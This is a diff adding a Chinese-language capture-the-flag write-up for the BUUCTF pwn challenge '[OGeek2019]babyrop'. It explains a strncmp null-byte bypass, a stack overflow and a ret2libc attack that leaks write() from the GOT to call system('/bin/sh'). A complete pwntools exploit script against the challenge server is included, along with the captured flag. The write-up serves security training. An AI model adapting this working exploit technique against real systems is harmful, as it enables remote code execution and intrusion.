@@ -500,6 +500,68 @@ io.interactive()
 
 ------
 
+### [[OGeek2019]babyrop](https://buuoj.cn/challenges#[OGeek2019]babyrop)
+
+先`file ./babyrop`查看文件类型再`checksec --file=./babyrop`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/1.png)
+
+用`IDA Pro 32bit`打开附件`babyrop`，按`F5`反汇编源码并查看主函数，可以看到将一个随机数赋值给了`buf`变量。
+
+![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/2.png)
+
+双击`sub_80486BB()`函数查看详情发现这是一个初始化缓存区的函数。
+
+![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/3.png)
+
+双击`sub_804871F()`函数查看详情，发现传入的参数`a1`被格式化字符串后赋值给了变量`s`。`v1`变量用于获取`char`型数组`buf`的大小，`strncmp()`函数用于比较用户输入的数和随机数的大小，构造`payload`时可以先用`\x00`来绕过`strncmp()`，因为`strlen()`遇到`\x00`时便会停止获取长度。
+
+![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/4.png)
+
+双击`sub_80487D0()`函数查看详情，发现该函数声明了一个`char`型数组的局部变量`buf`，可用栈大小为`0xe7`。如果`a1`等于`127`则会读入`0xc8`个字节到变量`buf`并不会导致栈溢出，但是当`a1`大于`0xe7`时就会读入`a1`个字节到变量`buf`从而造成栈溢出漏洞。因为`a1`是函数`sub_804871F()`的返回值，所以构造`payload`时让`a1`的值大于`\xe7`就可以导致栈溢出啦。
+
+![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/5.png)
+
+总的来说这题的思路就是：构造`payload`时先用`\x00`使得`v1`通过`strlen()`获取的返回值为0，从而绕过`strncmp()`的比较，此外`sub_804871F()`函数的返回值要尽可能大，所以`v5`读取输入时可以赋值为`\x00\xff\xff\xff\xff\xff\xff\xff`，这样函数返回值在传入`sub_80487D0()`函数时才能构造栈溢出漏洞。
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是需要注意到主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的内存地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，利用栈溢出漏洞并通过`read()`函数泄露`write()`函数在`got`表中的内存地址`write_address`。接着我们需要用到题目给出的`libc-2.23.so`，根据`libc`中`write()`函数的偏移地址可以计算出该`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址可以计算出这俩个函数的内存地址，最后利用栈溢出漏洞来完成系统调用`system('/bin/sh')`，输入`cat flag`后即可拿到`flag`。
+
+编写`Python`代码即可得到`flag{2c99881a-89e7-41c6-83a1-7a0e3781f961}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 25522)
+# io = process('./babyrop')
+e = ELF('./babyrop')
+io.sendline(b'\x00'.ljust(8, b'\xff'))
+write_plt = e.plt['write']
+write_got = e.got['write']
+main_address = 0x8048825
+payload = b'a'*0xe7 + b'pwn!'
+payload += flat(write_plt, main_address, 1, write_got, 4)
+io.sendlineafter(b'Correct\n', payload)
+write_address = u32(io.recv(4))
+log.success('write_address => 0x%x', write_address)
+libc = ELF('./libc-2.23.so')
+libcbase = write_address - libc.symbols['write']
+info('libcbase_address => 0x%x', libcbase)
+system_address = libcbase + libc.symbols['system']
+log.success('system_address => 0x%x', system_address)
+bin_sh_address = libcbase + libc.search(b'/bin/sh').__next__()
+log.success('bin_sh_address => 0x%x', bin_sh_address)
+io.sendline(b'\x00'.ljust(8, b'\xff'))
+payload = b'a'*0xe7 + b'pwn!'
+payload += flat(system_address, 0xdeadbeef, bin_sh_address)
+io.sendlineafter(b'Correct\n', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/6.png)
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
@@ -874,8 +936,6 @@ io.interactive()
 ![](https://paper.tanyaodan.com/ADWorld/pwn/4912/5.png)
 
 ------
-
-
 
 ## CTFShow
 
